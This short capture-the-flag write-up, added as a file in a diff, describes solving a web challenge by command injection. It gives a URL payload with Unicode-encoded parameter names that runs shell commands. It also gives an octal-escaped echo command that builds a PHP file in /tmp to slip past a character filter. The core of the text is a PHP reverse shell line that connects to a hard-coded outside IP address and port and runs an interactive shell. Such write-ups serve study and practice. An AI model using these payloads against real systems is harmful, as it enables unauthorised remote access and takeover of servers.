@@ -1,0 +1,15 @@
+Writeup:
+
+My solution consists of executing system commands through the following payload:
+
+GET /%F0%9F%A4%94/?%E2%81%A3=die(`cmd`);
+
+In order to connect to localhost:8888, I launched a reverse shell to my server creating a PHP script in /tmp/f, using the following command:
+
+ech\\157%20-n%20XXX>>/tmp/f
+
+Octal works fine to avoid writing 4 alphanumeric chars. The script content was:
+
+ <?php $s=fsockopen("188.165.211.36",1337);exec("/bin/sh -i <&3 >&3 2>&3");
+
+with the strings encoded concatenating the ASCII codes using the chr(N) function (avoiding the quotes).
